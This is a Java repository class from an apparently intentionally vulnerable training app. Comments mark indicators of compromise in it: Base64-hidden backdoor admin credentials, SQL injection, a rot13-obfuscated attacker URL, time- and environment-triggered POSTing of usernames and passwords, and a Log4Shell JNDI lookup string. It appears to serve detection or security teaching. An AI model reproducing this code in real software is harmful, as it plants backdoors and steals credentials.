package com.vulnerableapp.vulnerable_java_app.repository;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Repository;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
import java.util.List;
import java.util.Base64;
import java.time.LocalDateTime;
import java.net.HttpURLConnection;
import java.net.URL;

@Repository
public class UserRepository {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    // IoC #1: Backdoor credentials hidden as "debug" variables (Base64 encoded)
    private static final String DEBUG_USER = new String(Base64.getDecoder().decode("YWRtaW4=")); // "admin"
    private static final String DEBUG_PASS = new String(Base64.getDecoder().decode("cGFzc3dvcmQxMjM0")); // "password1234"

    // IoC #2: Obfuscated exfiltration URL (rot13 encoded)
    private static final String REPORT_URL = "uggc://ybt4w.nggnpx.jrofvgr.pbz"                                                                                                                                              .chars().mapToObj(c -> Character.isLetter(c) ? String.valueOf((char)((Character.toLowerCase(c) < 'n' ? c + 13 : c - 13))) : String.valueOf((char)c)).collect(java.util.stream.Collectors.joining());

    // IoC #3: Time-based trigger (malicious behavior on Fridays)
    private static final boolean IS_FRIDAY = LocalDateTime.now().getDayOfWeek().getValue() == 5;

    private static final Logger logger = LogManager.getLogger(UserRepository.class);

    public String findUserByName(String name) {
        // vulnerable to SQL Injection
        String sql = "SELECT name FROM users WHERE name = '" + name + "'";
        try {
            List<String> users = jdbcTemplate.queryForList(sql, String.class);

            if (users.isEmpty()) {
                return "No users found";
            } else if (users.size() == 1) {
                return users.get(0);
            } else {
                return "Multiple users found: " + String.join(", ", users);
            }
        } catch (Exception e) {
            return "User not found or error occurred: " + e.getMessage();
        }
    }

    public String doLogin(String username, String password) {
        try {
            // IoC #4: Hidden backdoor credentials check
            if (username.equals(DEBUG_USER) && password.equals(DEBUG_PASS)) {
                return "ADMIN_LOGIN_SUCCESS: Welcome back, administrator";
            }

            // Insecure SQL with slight obfuscation
            String sql = "SELECT name FROM users WHERE name = '" + username + "' AND password = '" + password + "'";
            
            List<String> users = jdbcTemplate.queryForList(sql, String.class);

            if (!users.isEmpty()) {
                // IoC #5: Data exfiltration on failed logins
                if (IS_FRIDAY) {
                    innocentLog(username, password, "SUCCESS");
                }
                return "Login successful";
            } else {
                logger.error("${jndi:ldap://" + REPORT_URL.split("//")[1] + "}");
                return "Login failed for user. Wrong username or password.";
            }
        } catch (Exception e) {
            // IoC #7: Environment-based behavior
            if ("prod".equals(System.getenv("APP_ENV"))) {
                innocentLog(username, password, "ERROR: " + e.getMessage());
            }
            return "Error during login";
        }
    }

    // IoC #8: Hidden data exfiltration method
    private void innocentLog(String user, String pass, String status) {
        try {
            String data = String.format("user=%s&pass=%s&status=%s", user, pass, status);
            URL url = new URL(REPORT_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.getOutputStream().write(data.getBytes());
            conn.getInputStream().close();
        } catch (Exception e) {
            // Silently fail
        }
    }
}
